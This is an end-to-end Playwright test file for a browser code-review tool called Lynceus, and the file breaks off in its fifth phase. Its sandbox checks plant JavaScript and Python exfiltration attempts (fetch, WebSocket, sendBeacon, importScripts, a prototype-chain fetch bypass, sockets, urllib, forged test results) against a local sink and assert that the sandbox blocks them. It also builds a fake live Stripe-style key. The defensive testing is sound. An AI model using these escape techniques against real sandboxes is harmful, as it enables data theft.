// Lynceus end-to-end checks (Phases 1-5) against the production build.
// Usage: npm run build && npm run e2e      (needs Playwright + Chromium installed)
import { createRequire } from 'module';
import http from 'http';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
const require = createRequire(import.meta.url);
const { chromium } = require('playwright');
const { zipSync, strToU8 } = require('fflate');

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../dist');
const PORT = 4173, APP = `http://127.0.0.1:${PORT}/`;
const CANARY = 'LYNCEUS_E2E_CANARY_7731';
const TYPES = { '.html': 'text/html', '.js': 'text/javascript', '.mjs': 'text/javascript', '.wasm': 'application/wasm', '.json': 'application/json', '.zip': 'application/zip', '.css': 'text/css', '.svg': 'image/svg+xml', '.webmanifest': 'application/manifest+json' };

function serve() {
  const s = http.createServer((req, res) => {
    let p = decodeURIComponent(new URL(req.url, APP).pathname);
    if (p.endsWith('/')) p += 'index.html';
    const f = path.join(ROOT, p);
    if (!f.startsWith(ROOT) || !fs.existsSync(f)) { res.writeHead(404); return res.end('not found'); }
    res.writeHead(200, { 'Content-Type': TYPES[path.extname(f)] || 'application/octet-stream' });
    fs.createReadStream(f).pipe(res);
  });
  return new Promise((r) => s.listen(PORT, '127.0.0.1', () => r(s)));
}

// A "sink" on another origin: any connection reaching it means user code got data out.
const SINK_PORT = 4174, SINK = `http://127.0.0.1:${SINK_PORT}/`;
let sinkHits = 0;
const sink = http.createServer((req, res) => { res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('ok'); });
sink.on('connection', () => { sinkHits++; });
await new Promise((r) => sink.listen(SINK_PORT, '127.0.0.1', r));

const results = [];
const check = (name, pass, detail = '') => { results.push({ name, pass, detail }); console.log(`${pass ? 'PASS' : 'FAIL'}  ${name}${detail && !pass ? '  -> ' + detail : ''}`); };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
// Playwright's fill() is very slow for 30k-line strings; set the value and fire 'input' like a paste would.
const bigFill = (page, sel, text) => page.evaluate(([s, t]) => { const el = document.querySelector(s); el.value = t; el.dispatchEvent(new Event('input', { bubbles: true })); }, [sel, text]);

if (!fs.existsSync(path.join(ROOT, 'index.html'))) { console.error('Run `npm run build` first.'); process.exit(2); }
let server = await serve();
const browser = await chromium.launch();
const ctx = await browser.newContext({ viewport: { width: 1000, height: 800 } });
const requests = [];
ctx.on('request', (r) => requests.push(r.url()));
try {
  const cspViolations = [];
  const pageErrors = [];
  const watch = (p) => {
    p.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) cspViolations.push(m.text()); });
    p.on('pageerror', (e) => pageErrors.push(e.message));
    p.on('worker', (w) => w.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) cspViolations.push('worker: ' + m.text()); }));
  };
  ctx.on('page', watch);
  let page = await ctx.newPage();
  await page.goto(APP);

  // ---- CSP present + no violations on load
  const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  check('CSP meta in built page (connect-src self)', !!csp && csp.includes("connect-src 'self'"), csp);

  // ---- theme: default light, toggle persists
  check('default theme is light', (await page.evaluate(() => document.documentElement.dataset.theme)) === 'light');
  await page.getByRole('button', { name: /switch to dark mode/i }).click();
  await page.reload();
  check('dark theme persists after reload', (await page.evaluate(() => document.documentElement.dataset.theme)) === 'dark');
  await page.getByRole('button', { name: /switch to light mode/i }).click();

  // ---- paste + auto-detect + load
  await page.locator('#paste').fill(`import os\n\ndef secret():\n    # ${CANARY}\n    if os.environ:\n        return None\n`);
  check('language auto-detect shows Python, tagged heuristic', /Python/.test(await page.getByTestId('guess').innerText()) && /heuristic/.test(await page.getByTestId('guess').innerText()));
  await page.getByRole('button', { name: 'Review this code' }).click();
  check('paste loads 1 Python file', /pasted\.py/.test(await page.getByTestId('loaded').innerText()));

  // ---- acceptance #9: close + reopen tab with retention OFF shows no code, storage holds no code
  await page.close();
  page = await ctx.newPage();
  await page.goto(APP);
  await sleep(300);
  const leftover = await page.evaluate(async (c) => {
    const html = document.body.innerText.includes(c) || document.querySelector('#paste').value.includes(c);
    const ls = JSON.stringify({ ...localStorage }).includes(c);
    const ss = JSON.stringify({ ...sessionStorage }).includes(c);
    const dbs = (await indexedDB.databases()).map((d) => d.name);
    let cached = false;
    for (const k of await caches.keys()) for (const req of await (await caches.open(k)).keys()) {
      const body = await (await (await caches.open(k)).match(req)).text().catch(() => '');
      if (body.includes(c)) cached = true;
    }
    return { html, ls, ss, dbs, cached };
  }, CANARY);
  check('#9 reopened tab shows no previous code (retention off)', !leftover.html && !leftover.ls && !leftover.ss && !leftover.cached && !leftover.dbs.includes('lynceus-session'), JSON.stringify(leftover));
  check('no "Loaded" panel after reopen', (await page.getByTestId('loaded').count()) === 0);

  // ---- zip upload keeps folders, reports skipped
  const zip = zipSync({
    'proj/pkg/calc.py': strToU8('def add(a, b):\n    return a + b\n'),
    'proj/tests/test_calc.py': strToU8('from pkg.calc import add\n\ndef test_add():\n    assert add(1, 2) == 3\n'),
    'proj/notes.txt': strToU8('hello'),
  });
  await page.getByTestId('file-input').setInputFiles({ name: 'proj.zip', mimeType: 'application/zip', buffer: Buffer.from(zip) });
  await page.getByTestId('pending').waitFor();
  const pend = await page.getByTestId('pending').innerText();
  check('zip upload keeps folder paths', pend.includes('pkg/calc.py') && pend.includes('tests/test_calc.py') && /test/.test(pend), pend);
  check('zip upload lists skipped file with reason', /notes\.txt[\s\S]*not a Python or JavaScript/.test(await page.getByTestId('skipped').innerText()));

  // ---- multi-file upload
  await page.getByTestId('file-input').setInputFiles([
    { name: 'util.js', mimeType: 'text/javascript', buffer: Buffer.from('module.exports = { x: 1 };\n') },
    { name: 'util.test.js', mimeType: 'text/javascript', buffer: Buffer.from("test('x', () => {});\n") },
  ]);
  await sleep(200);
  const pend2 = await page.getByTestId('pending').innerText();
  check('multi-file upload adds JS files', pend2.includes('util.js') && pend2.includes('util.test.js'), pend2);

  // ---- size limits
  await bigFill(page, '#paste', 'x = 1\n'.repeat(5200));
  check('warns above 5,000 lines', /Large input/.test(await page.getByTestId('limits').innerText()));
  await bigFill(page, '#paste', 'x = 1\n'.repeat(30100));
  const lim = await page.getByTestId('limits').innerText();
  check('hard stop above 30,000 lines (button disabled)', /Too much code/.test(lim) && await page.getByRole('button', { name: 'Review this code' }).isDisabled(), lim);
  await bigFill(page, '#paste', '');

  // ---- remember ON: survives reopen, indicator shown; Clear everything wipes it
  await page.locator('#paste').fill(`def f():\n    return "${CANARY}"\n`);
  await page.getByTestId('remember').check();
  await page.getByRole('button', { name: 'Review this code' }).click();
  await sleep(300);
  await page.close();
  page = await ctx.newPage();
  await page.goto(APP);
  await page.getByTestId('loaded').waitFor({ timeout: 5000 }).catch(() => {});
  check('remember ON: session restored after reopen', (await page.getByTestId('loaded').count()) === 1);
  check('remember ON: "Remembering" indicator visible', await page.getByText('● Remembering').isVisible());
  await page.getByRole('button', { name: 'Clear everything' }).click();
  await sleep(300);
  const afterClear = await page.evaluate(async (c) => ({
    dbs: (await indexedDB.databases()).map((d) => d.name),
    remember: JSON.parse(localStorage.getItem('lynceus.settings') || '{}').remember,
    body: document.body.innerText.includes(c),
  }), CANARY);
  check('Clear everything wipes IndexedDB and turns Remember off', !afterClear.dbs.includes('lynceus-session') && afterClear.remember === false && !afterClear.body, JSON.stringify(afterClear));
  await page.reload();
  check('after Clear + reload: nothing restored', (await page.getByTestId('loaded').count()) === 0);


  // ================= Phase 2: analysis, code view, evidence, drag-and-drop =================
  const JS_SRC = "function classify(n) {\n  if (n < 0) {\n    return 'negative';\n  }\n  let total = 0;\n  for (let i = 0; i < n; i++) {\n    if (i % 2) {\n      if (i > 2) {\n        if (i > 4) {\n          console.log(i);\n        }\n      }\n    }\n  }\n  save(total);\n  return total;\n}\nmodule.exports = { classify };\n";
  const PY_SRC = "import random\n\ndef pick(xs):\n    total = 0\n    for x in xs:\n        if x % 2:\n            total += x\n    xs.append(random.random())\n    return total\n";
  await page.getByRole('button', { name: 'Clear everything' }).click();
  // drag-and-drop onto the page (synthetic DataTransfer: no folder entries, so the plain-files path is used)
  await page.evaluate(([name, text]) => {
    const dt = new DataTransfer();
    dt.items.add(new File([text], name, { type: 'text/javascript' }));
    const sec = document.querySelector('section[aria-labelledby="input-h"]');
    sec.dispatchEvent(new DragEvent('dragenter', { bubbles: true, cancelable: true, dataTransfer: dt }));
    sec.dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer: dt }));
  }, ['dropped/classify.js', JS_SRC]);
  await page.getByTestId('pending').waitFor({ timeout: 5000 }).catch(() => {});
  check('drag-and-drop a file onto the page adds it', (await page.getByTestId('pending').count()) === 1 && /classify\.js/.test(await page.getByTestId('pending').innerText()));
  // drop one file on the paste box -> its text lands in the box
  await page.evaluate((text) => {
    const dt = new DataTransfer();
    dt.items.add(new File([text], 'pick.py', { type: 'text/x-python' }));
    const ta = document.querySelector('#paste');
    ta.dispatchEvent(new DragEvent('dragenter', { bubbles: true, cancelable: true, dataTransfer: dt }));
    ta.dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer: dt }));
  }, PY_SRC);
  await sleep(300);
  check('dropping one file on the paste box fills the box', (await page.locator('#paste').inputValue()).includes('def pick') && (await page.locator('input[type=text]').first().inputValue()) === 'pick.py');
  // JS only first: remove the pasted Python so no consent is needed yet
  await bigFill(page, '#paste', '');
  await page.getByRole('button', { name: 'Review this code' }).click();
  await page.locator('nav.inline').getByRole('button', { name: 'Code' }).click();
  await page.locator('[data-line="10"]').waitFor({ timeout: 15000 });
  const row10 = page.locator('[data-line="10"]');
  check('JS: console.log line gets gutter letter I', (await row10.locator('.letter').innerText()).trim() === 'I');
  check('JS: unknown call save() gets U (never pure)', (await page.locator('[data-line="15"] .letter').innerText()).trim() === 'U');
  check('calm by default: no role tint until a chip is pressed', !(await page.locator('.code').getAttribute('class')).includes('show-'));
  await page.locator('.chip.r-io').click();
  check('role chip turns on the tint for that role', (await page.locator('.code').getAttribute('class')).includes('show-io'));
  await row10.click();
  const pane = await page.locator('.right-pane').innerText();
  check('tap a line: evidence pane shows rule, detail and certainty', /call\.io/.test(pane) && /console\.log\(\) matches I\/O rule/.test(pane) && /certain/.test(pane), pane.slice(0, 300));
  check('deep nesting flagged (level 4 > limit 3)', (await page.locator('[data-line="9"] .flag').innerText()).includes('⚑'));
  await page.locator('[data-line="6"] .fold-btn').click();
  const summary = await page.locator('.summary').first().innerText();
  check('collapse shows syntax-tree summary', /for loop · \d+ branches · calls console\.log\(\)/.test(summary), summary);
  check('collapsed lines are hidden', (await page.locator('[data-line="10"]').count()) === 0);
  await page.keyboard.press('Escape');
  check('Escape clears the selection (pane shows How to read this)', /How to read this/.test(await page.locator('.right-pane').innerText()));
  // Python: consent first, then analysis in Pyodide
  await page.locator('nav.inline').getByRole('button', { name: 'Input' }).click();
  await page.locator('#paste').fill(PY_SRC);
  await page.getByRole('button', { name: 'Review this code' }).click();
  await page.locator('nav.inline').getByRole('button', { name: 'Code' }).click();
  await page.getByRole('button', { name: 'Download Python support' }).waitFor({ timeout: 10000 });
  check('Python asks before the one-time download, showing the size', /\d+\.\d MB/.test(await page.locator('.consent').innerText()));
  await page.getByRole('button', { name: 'Download Python support' }).click();
  await page.getByTestId('file-select').waitFor({ timeout: 60000 });
  await page.selectOption('[data-testid=file-select]', 'pick.py');
  await page.locator('[data-line="8"]').waitFor();
  check('Python: xs.append() is heuristic mutation... but random.random() makes it I/O', (await page.locator('[data-line="8"] .letter').innerText()).trim() === 'I');
  await page.locator('[data-line="7"]').click();
  check('Python: local += is pure, from the syntax tree', /assign\.local/.test(await page.locator('.right-pane').innerText()));
  const pyCached = await page.evaluate(async () => (await caches.keys()).some((k) => k.startsWith('lynceus-pyodide-')));
  check('Pyodide stored by the service worker after first use', pyCached);


  // ================= Phase 3: sandbox, test runner, per-test coverage =================
  const file = (name, text) => ({ name, mimeType: 'text/plain', buffer: Buffer.from(text) });
  async function runProject(files, { width = 1000, timeout } = {}) {
    const p = await ctx.newPage();
    if (width !== 1000) await p.setViewportSize({ width, height: 800 });
    await p.goto(APP);
    await p.getByTestId('file-input').setInputFiles(files);
    await p.getByRole('button', { name: 'Review this code' }).click();
    const nav = width >= 760 ? p.locator('nav.inline') : p.locator('nav.tabbar:not(.inline)');
    await nav.getByRole('button', { name: 'Tests' }).click();
    if (timeout) { await p.locator('.limits summary').click(); await p.getByTestId('test-timeout').fill(String(timeout)); await p.getByTestId('test-timeout').dispatchEvent('change'); }
    await p.getByRole('button', { name: /^Run tests/ }).click();
    await p.getByTestId('test-summary').waitFor({ timeout: 120000 });
    const res = {};
    for (const li of await p.getByTestId('result').all()) res[(await li.locator('.name').innerText()).trim()] = { outcome: await li.getAttribute('data-outcome'), text: await li.innerText() };
    return { p, res, nav };
  }
  const JS_CALC = "export function sign(n) {\n  if (n < 0) {\n    return -1;\n  }\n  return 1;\n}\nexport const twice = (x) => x * 2;\n";
  const JS_TEST = "import { sign, twice } from './calc.js';\ndescribe('calc', () => {\n  test('sign of 5', () => { expect(sign(5)).toBe(1); });\n  test('twice is wrong', () => { expect(twice(2)).toBe(5); });\n  test('reads a file', () => { require('fs').readFileSync('x'); });\n});\n";
  {
    const { p, res, nav } = await runProject([file('src/calc.js', JS_CALC), file('src/calc.test.js', JS_TEST)]);
    check('JS tests: pass reported', res['calc › sign of 5']?.outcome === 'passed', JSON.stringify(res));
    check('JS tests: failure shows the assertion message', res['calc › twice is wrong']?.outcome === 'failed' && /Expected: 5[\s\S]*Received: 4/.test(res['calc › twice is wrong'].text));
    check('JS tests: Node built-in fails that one test with a clear reason', res['calc › reads a file']?.outcome === 'error' && /Node built-in "fs" isn't available/.test(res['calc › reads a file'].text));
    await p.getByRole('button', { name: 'src/calc.js', exact: true }).first().click();
    await p.locator('[data-line="3"]').waitFor();
    check('coverage: untested line is dimmed and labelled "not run by the provided tests"', (await p.locator('[data-line="3"]').getAttribute('class')).includes('cov-miss') && (await p.locator('[data-line="3"] .nr-tag').innerText()).includes('not run by the provided tests'));
    check('coverage: never calls untested code "dead"', !/\bdead\b/i.test(await p.locator('.code').innerText()));
    await p.locator('[data-line="5"]').click();
    check('tap a covered line: lists the tests that ran it', /Run by 1 test[\s\S]*calc › sign of 5/.test(await p.getByTestId('line-tests').first().innerText()));
    await p.getByTestId('coverage-toggle').click();
    check('coverage layer can be switched off', (await p.locator('.cov-miss').count()) === 0);
    await p.close();
  }
  const PY_CALC = "def sign(n):\n    if n < 0:\n        return -1\n    return 1\n";
  const PY_TEST = "from calc import sign\n\ndef test_positive():\n    assert sign(5) == 1\n\ndef test_wrong():\n    assert sign(2) == 7\n";
  {
    const { p, res } = await runProject([file('calc.py', PY_CALC), file('test_calc.py', PY_TEST)]);
    check('Python tests: pytest pass and fail with assertion text', res['test_positive']?.outcome === 'passed' && res['test_wrong']?.outcome === 'failed' && /assert 1 == 7/.test(res['test_wrong'].text), JSON.stringify(res).slice(0, 400));
    await p.getByRole('button', { name: 'calc.py', exact: true }).first().click();
    await p.locator('[data-line="3"]').waitFor();
    check('Python coverage: untested return is dimmed and labelled', (await p.locator('[data-line="3"]').getAttribute('class')).includes('cov-miss'));
    await p.locator('[data-line="4"]').click();
    check('Python coverage: line shows the exact tests that ran it', /Run by 2 tests/.test(await p.getByTestId('line-tests').first().innerText()));
    await p.close();
  }
  {
    const before = sinkHits;
    const EXFIL_JS = [
      `test('fetch', async () => { await fetch('${SINK}a'); });`,
      `test('xhr', () => { const x = new XMLHttpRequest(); x.open('GET', '${SINK}b'); x.send(); });`,
      `test('websocket', () => { new WebSocket('ws://127.0.0.1:${SINK_PORT}/'); });`,
      `test('eventsource', () => { new EventSource('${SINK}c'); });`,
      `test('beacon', () => { navigator.sendBeacon('${SINK}d', 'x'); });`,
      `test('nested worker', () => { new Worker('${SINK}e.js'); });`,
      `test('importScripts', () => { importScripts('${SINK}f.js'); });`,
      `test('prototype fetch', async () => { const f = Object.getPrototypeOf(Object.getPrototypeOf(self)).fetch; await f.call(self, '${SINK}g'); });`,
      `test('fake result via postMessage', () => { self.postMessage({ type: 'result', result: { id: 'x', outcome: 'passed' } }); });`,
    ].join('\n');
    const { p, res } = await runProject([file('exfil.test.js', EXFIL_JS)]);
    const names = ['fetch', 'xhr', 'websocket', 'eventsource', 'beacon', 'nested worker', 'importScripts', 'prototype fetch'];
    const bad = names.filter((n) => !(res[n] && res[n].outcome === 'failed' && /network blocked by Lynceus/.test(res[n].text)));
    check('planted JS exfiltration tests all fail loudly ("network blocked by Lynceus")', bad.length === 0, bad.map((n) => `${n}: ${JSON.stringify(res[n])}`).join(' | '));
    check('JS user code cannot post fake results to the page', res['fake result via postMessage']?.outcome === 'failed' && /reserved by Lynceus/.test(res['fake result via postMessage'].text));
    await p.close();
    const EXFIL_PY = [
      'import pytest', '',
      'def test_js():\n    import js\n    js.fetch("' + SINK + 'h")\n',
      'def test_pyodide_http():\n    from pyodide.http import pyfetch\n',
      'def test_micropip():\n    import micropip\n',
      'def test_socket():\n    import socket\n    socket.create_connection(("127.0.0.1", ' + SINK_PORT + '))\n',
      'def test_urllib():\n    import urllib.request\n    urllib.request.urlopen("' + SINK + 'i")\n',
      'def test_http_client():\n    import http.client\n    c = http.client.HTTPConnection("127.0.0.1", ' + SINK_PORT + ')\n    c.request("GET", "/j")\n',
    ].join('\n');
    const r2 = await runProject([file('test_exfil.py', EXFIL_PY)]);
    const pyBad = ['test_js', 'test_pyodide_http', 'test_micropip', 'test_socket', 'test_urllib', 'test_http_client'].filter((n) => !(r2.res[n] && r2.res[n].outcome === 'failed' && /network blocked by Lynceus/.test(r2.res[n].text)));
    check('planted Python exfiltration tests all fail loudly', pyBad.length === 0, pyBad.map((n) => `${n}: ${JSON.stringify(r2.res[n])?.slice(0, 200)}`).join(' | '));
    await r2.p.close();
    check('zero connections reached the sink during exfiltration tests', sinkHits === before, `${sinkHits - before} hits`);
  }
  {
    const { p, res } = await runProject([file('loop.test.js', "test('spins forever', () => { while (true) {} });\ntest('runs after', () => { expect(1 + 1).toBe(2); });\n")], { timeout: 2 });
    check('JS infinite loop: stopped at the limit and reported by name', res['spins forever']?.outcome === 'timeout' && /Stopped after 2 s/.test(res['spins forever'].text), JSON.stringify(res));
    check('JS: the other tests still ran in a fresh sandbox', res['runs after']?.outcome === 'passed');
    await p.close();
    const r2 = await runProject([file('test_loop.py', "def test_spins():\n    while True:\n        pass\n\ndef test_ok():\n    assert True\n")], { timeout: 3 });
    check('Python infinite loop: stopped and reported by name; others still ran', r2.res['test_spins']?.outcome === 'timeout' && r2.res['test_ok']?.outcome === 'passed', JSON.stringify(r2.res));
    await r2.p.close();
    // restore the default limit for later checks
    const p3 = await ctx.newPage(); await p3.goto(APP); await p3.evaluate(() => { const s = JSON.parse(localStorage.getItem('lynceus.settings')); s.testTimeoutSec = 10; localStorage.setItem('lynceus.settings', JSON.stringify(s)); }); await p3.close();
  }
  {
    const p = await ctx.newPage();
    await p.goto(APP);
    await p.locator('#paste').fill(JS_SRC);
    await p.getByRole('button', { name: 'Review this code' }).click();
    await p.locator('nav.inline').getByRole('button', { name: 'Tests' }).click();
    check('no tests: says so plainly and turns coverage off', /No tests found/.test(await p.getByTestId('no-tests').innerText()));
    await p.close();
  }
  {
    const { p } = await runProject([file('src/calc.js', JS_CALC), file('src/calc.test.js', JS_TEST)], { width: 360 });
    const over = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    check('phone: Tests tab with results has no horizontal scroll', over <= 0, `${over}px`);
    await p.screenshot({ path: path.join(ROOT, '..', 'tests', 'e2e', 'phone-tests.png'), fullPage: true });
    await p.close();
  }

  // phone: bottom sheet
  {
    const p = await ctx.newPage();
    await p.setViewportSize({ width: 360, height: 740 });
    await p.goto(APP);
    await p.locator('#paste').fill(JS_SRC);
    await p.getByRole('button', { name: 'Review this code' }).click();
    await p.locator('nav.tabbar:not(.inline)').getByRole('button', { name: 'Code' }).click();
    await p.locator('[data-line="10"]').click();
    check('phone: tapping a line opens the bottom sheet with evidence', await p.locator('.sheet').isVisible() && /call\.io/.test(await p.locator('.sheet').innerText()));
    const over = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    check('phone: Code tab has no page-level horizontal scroll', over <= 0, `${over}px`);
    await p.screenshot({ path: path.join(ROOT, '..', 'tests', 'e2e', 'phone-code.png') });
    await p.close();
  }

  // ================= Phase 4: queue, risk breakdown, diff, passes =================
  const SHOP = [
    "export function busy(items, log) {",            // 1
    "  let total = 0;",                               // 2
    "  for (const it of items) {",                    // 3
    "    if (it.qty > 0) {",                          // 4
    "      if (it.price > 100) {",                    // 5
    "        log.write(it);",                         // 6
    "      } else if (it.price < 0) {",               // 7
    "        throw new Error('bad price');",          // 8
    "      }",                                        // 9
    "      total += it.qty * it.price;",              // 10
    "    }",                                          // 11
    "  }",                                            // 12
    "  return total;",                                // 13
    "  console.log('never');",                        // 14
    "}",                                              // 15
    "export function formatTotal(n) {",               // 16
    "  return helper(n).toFixed(2);",                 // 17
    "}",                                              // 18
    "export function unusedThing(a) {",               // 19
    "  return a + 1;",                                // 20
    "}",                                              // 21
    "export const add = (a, b) => a + b;",            // 22
    "export const sub = (a, b) => a - b;",            // 23
    "export const neg = (a) => -a;",                  // 24
    "",
  ].join('\n');
  const SHOP_TEST = "import { busy, add } from './shop.js';\ntest('adds', () => { expect(add(1, 2)).toBe(3); });\ntest('busy total', () => { expect(busy([{ qty: 1, price: 5 }], { write() {} })).toBe(5); });\n";
  const SHOP_DIFF = [
    'diff --git a/src/shop.js b/src/shop.js', '--- a/src/shop.js', '+++ b/src/shop.js',
    '@@ -16,3 +16,3 @@', ' export function formatTotal(n) {', '-  return n.toFixed(2);', '+  return helper(n).toFixed(2);', ' }',
    '@@ -40,2 +40,2 @@', ' function notInTheFile() {', '-  return 1;', '+  return 2;',
    '',
  ].join('\n');
  const SHOP_SPEC = '- Format the total with two decimals\n- Add two numbers\n';
  async function loadShop(width = 1000) {
    const p = await ctx.newPage();
    await p.setViewportSize({ width, height: 800 });
    await p.goto(APP);
    await p.evaluate(() => { const d = document.querySelector('details:has(#diff)'); if (d) d.open = true; });
    await p.locator('#diff').fill(SHOP_DIFF);
    await p.locator('#spec').fill(SHOP_SPEC);
    await p.getByTestId('file-input').setInputFiles([file('src/shop.js', SHOP), file('src/shop.test.js', SHOP_TEST)]);
    await p.getByRole('button', { name: 'Review this code' }).click();
    const nav = width >= 760 ? p.locator('nav.inline') : p.locator('nav.tabbar:not(.inline)');
    return { p, nav };
  }
  {
    const { p, nav } = await loadShop();
    await nav.getByRole('button', { name: 'Queue' }).click();
    await p.getByTestId('queue-item').first().waitFor({ timeout: 30000 });
    const names = [];
    for (const li of await p.locator('ol.top [data-testid="queue-item"]').all()) names.push(await li.getAttribute('data-fn'));
    const all = await p.getByTestId('queue-item').count();
    check('queue: top list holds the 5 riskiest, the rest below', names.length === 5 && all > 5 && (await p.getByRole('heading', { name: 'All other functions' }).count()) === 1, `${names.length} top of ${all}`);
    check('queue: the complex, nested, side-effecting function ranks first', names[0] === 'busy', names.join(', '));
    check('queue: says plainly when there is no test evidence', /No test evidence/.test(await p.getByTestId('no-evidence').innerText()));
    await p.locator('[data-fn="busy"] [data-testid="score"]').click();
    const bd = await p.getByTestId('breakdown').innerText();
    check('queue: score breakdown lists every factor and the total', /Complexity/i.test(bd) && /Nesting/i.test(bd) && /Total: \d+ \/ 100/.test(bd) && /not used/.test(bd), bd.slice(0, 400));
    await p.locator('[data-fn="busy"] [data-testid="score"]').click();
    await p.locator('[data-fn="formatTotal"] [data-testid="score"]').click();
    const bd2 = await p.getByTestId('breakdown').innerText();
    check('diff: changed function gets the diff factor', /changed in the diff/.test(bd2) && /· changed/.test(await p.locator('[data-fn="formatTotal"]').innerText()), bd2.slice(0, 400));
    check('diff: a hunk that does not match the loaded code is reported, not guessed', /Hunk doesn't match the loaded code/.test(await p.getByTestId('diff-problems').innerText()));
    await p.getByTestId('changed-only').check();
    const changed = [];
    for (const li of await p.getByTestId('queue-item').all()) changed.push(await li.getAttribute('data-fn'));
    check('queue: "Changed functions only" filters to the diff', changed.length === 1 && changed[0] === 'formatTotal', changed.join(', '));
    await p.getByTestId('changed-only').uncheck();

    // Shape
    await nav.getByRole('button', { name: 'Code' }).click();
    await p.getByTestId('pass-shape').click();
    await p.locator('[data-testid="shape-fn"]', { hasText: 'formatTotal()' }).click();
    const callees = await p.getByTestId('callees').innerText();
    check('shape: outline + callees, unknown call marked unresolved', /helper\(\)[\s\S]*unresolved/.test(callees) && (await p.getByTestId('shape-fn').count()) >= 6, callees);
    await p.locator('[data-testid="shape-fn"]', { hasText: 'add()' }).click();
    check('shape: callers include the test that calls it', /adds|module-level|shop\.test\.js/.test(await p.getByTestId('callers').innerText()), await p.getByTestId('callers').innerText());

    // Flow, before any tests
    await p.getByTestId('pass-flow').click();
    check('flow without tests: banner says only unreachable code is marked', /only marks unreachable code/.test(await p.getByTestId('flow-no-coverage').innerText()));
    check('flow: code after return is labelled unreachable', (await p.locator('[data-line="14"]').getAttribute('data-flow')) === 'unreachable' && /unreachable/.test(await p.locator('[data-line="14"] [data-testid="unreachable-tag"]').innerText()));
    await p.locator('[data-line="14"]').click();
    check('flow: tapping it gives the reason from the syntax tree', /comes after return[\s\S]*can never run/.test(await p.locator('.right-pane').getByTestId('line-unreachable').innerText()));

    // Intent before tests: no scaffolding guesses
    await p.getByTestId('pass-intent').click();
    check('intent: without tests nothing is flagged as scaffolding', /Run the tests first/.test(await p.getByTestId('scaffolding').innerText()));

    // Run tests, then Flow and Intent again
    await nav.getByRole('button', { name: 'Tests' }).click();
    await p.getByRole('button', { name: /^Run tests/ }).click();
    await p.getByTestId('test-summary').waitFor({ timeout: 120000 });
    await nav.getByRole('button', { name: 'Code' }).click();
    await p.getByTestId('pass-flow').click();
    await p.locator('[data-line="2"]').waitFor();
    check('flow with tests: a line the tests ran is marked run', (await p.locator('[data-line="2"]').getAttribute('class')).includes('flow-run'));
    check('flow with tests: an untested line is dimmed and labelled', (await p.locator('[data-line="20"]').getAttribute('class')).includes('cov-miss') && /not run by the provided tests/.test(await p.locator('[data-line="20"]').innerText()) && /not run by the provided tests/.test(await p.locator('[data-line="17"]').innerText()));
    await p.getByTestId('pass-intent').click();
    await p.getByTestId('spec-item').first().click();
    const sug = await p.getByTestId('suggestions').innerText();
    check('intent: word-match suggestion offered, marked heuristic', /formatTotal/.test(sug), sug);
    await p.getByTestId('suggestions').locator('li', { hasText: 'formatTotal' }).getByRole('button', { name: 'Confirm' }).click();
    check('intent: confirming a suggestion links it', /formatTotal[\s\S]*confirmed suggestion/.test(await p.getByTestId('linked').innerText()));
    await p.getByTestId('spec-item').nth(1).click();
    await p.getByTestId('pick-functions').getByRole('button', { name: 'add()', exact: true }).click();
    check('intent: linking by hand works', /add[\s\S]*manual/.test(await p.getByTestId('linked').innerText()));
    const sc = await p.getByTestId('scaffolding').innerText();
    check('intent: untested, unlinked function flagged as possible scaffolding; linked one is not', /unusedThing/.test(sc) && !/formatTotal/.test(sc), sc);
    await p.close();
  }
  // phone: Queue and Shape fit
  {
    const { p, nav } = await loadShop(360);
    await nav.getByRole('button', { name: 'Queue' }).click();
    await p.getByTestId('queue-item').first().waitFor({ timeout: 30000 });
    await p.locator('[data-fn="busy"] [data-testid="score"]').click();
    const o1 = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    await p.screenshot({ path: path.join(ROOT, '..', 'tests', 'e2e', 'phone-queue.png'), fullPage: true });
    await nav.getByRole('button', { name: 'Code' }).click();
    await p.getByTestId('pass-shape').click();
    await p.locator('[data-testid="shape-fn"]', { hasText: 'formatTotal()' }).click();
    const o2 = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    await p.getByTestId('pass-flow').click();
    const o3 = await p.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
    check('phone: Queue, Shape and Flow have no horizontal scroll', o1 <= 0 && o2 <= 0 && o3 <= 0, `${o1}/${o2}/${o3}px`);
    await p.getByTestId('pass-shape').click();
    await p.screenshot({ path: path.join(ROOT, '..', 'tests', 'e2e', 'phone-shape.png'), fullPage: true });
    await p.close();
  }

  // ================= Phase 5: findings, masked secrets, lens, review progress, report =================
  const KEY5 = 'sk_live_' + 'Zx9Yw8Vu7Ts6Rq5Po4Nm';
  const PAY = [
    "import { readFile } from './util.js';",          // 1
    "import { unusedImp } from './util.js';",         // 2
    `const STRIPE = "${KEY5}";`,                      // 3
    "",                                               // 4
    "export function total(items) {",                 // 5
    "  let sum = 0;",                                 // 6
    "  for (const it of items) {",                    // 7
    "    sum += it.n;",                               // 8
    "  }",                                            // 9
    "  return sum;",                                  // 10
    "}",                                              // 11
    "",                                               // 12
    "export function count(items) {",                 // 13
    "  let sum = 0;",                                 // 14
    "  const extra = 1;",                             // 15
    "  try { readFile(STRIPE); } catch (e) {}",       // 16
    "  if (items == 0) return 0;",                    // 17
    "  return items.length + sum;",                   // 18
    "}",                                              // 19
    "// TODO: refunds",                               // 20
    "export function refund() {}",                    // 21
    "",
  ].join('\n');
  const UTIL = "export function readFile(x) { return x; }\nexport function unusedImp() { return 1; }\n";
  async function readDownload(p, testid) {
    const [dl] = await Promise.all([p.waitForEvent('download'), p.getByTestId(testid).click()]);
    return fs.readFileSync(await dl.path(), 'utf8');
  }
  {
    const p = await ctx.newPage();
    await p.goto(APP);
    await p.getByTestId('file-input').setInputFiles([file('src/pay.js', PAY), file('src/util.js', UTIL)]);
    await p.getByRole('button', { name: 'Review this code' }).click();
    const nav = p.locator('nav.inline');
    await nav.getByRole('button', { name: 'Code' }).click();
